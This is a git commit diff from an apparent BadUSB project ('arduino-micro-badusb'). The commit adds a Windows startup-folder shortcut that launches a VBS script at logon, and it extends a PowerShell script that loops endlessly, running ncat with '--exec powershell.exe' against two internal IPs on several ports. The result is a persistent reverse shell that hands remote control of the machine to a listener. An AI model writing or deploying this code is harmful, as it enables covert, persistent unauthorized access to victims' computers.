2cb22ea375d18180f734601d0d8f1555934dd7e0
h3xagon <62241425+h3xagon0001@users.noreply.github.com>
2025-06-30 21:31:51 +0800

    added more ports and shortcut to startup

--- download.ps1
+++ download.ps1
@@ -4,6 +4,11 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-mic
 
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/init.ps1 -OutFile init.ps1
 
+# create shortcut in startup folder
+$shell = New-Object -ComObject WScript.Shell
+$shortcut = $shell.CreateShortcut("$($env:APPDATA)\Microsoft\Windows\Start Menu\Programs\Startup\run.lnk")
+$shortcut.TargetPath = "$($env:APPDATA)\Fairy\run.vbs"
+$shortcut.Save()
 
 # download and extract nmap
 Invoke-WebRequest -Uri https://github.com/h3xagon0001/arduino-micro-badusb/raw/refs/heads/main/nmap.zip -OutFile nmap.zip
--- fairy.ps1
+++ fairy.ps1
@@ -6,17 +6,19 @@ Write-Output "Directory Changed"
 Write-Output "Connecting to listener"
 for (;;)
 {
-# for port 6969
+# for ip 10.133.33.205
 $ListenerIP = "10.133.33.205"
+.\ncat.exe -C --exec "powershell.exe" $ListenerIP 8888
 .\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969
+.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6699
+.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6996
+.\ncat.exe -C --exec "powershell.exe" $ListenerIP 9669
 
+# for ip 10.133.61.215
 $ListenerIP = "10.133.61.215"
+.\ncat.exe -C --exec "powershell.exe" $ListenerIP 8888
 .\ncat.exe -C --exec "powershell.exe" $ListenerIP 6969
-
-# for port 6699
-$ListenerIP = "10.133.33.205"
 .\ncat.exe -C --exec "powershell.exe" $ListenerIP 6699
-
-$ListenerIP = "10.133.61.215"
-.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6699
+.\ncat.exe -C --exec "powershell.exe" $ListenerIP 6996
+.\ncat.exe -C --exec "powershell.exe" $ListenerIP 9669
 }
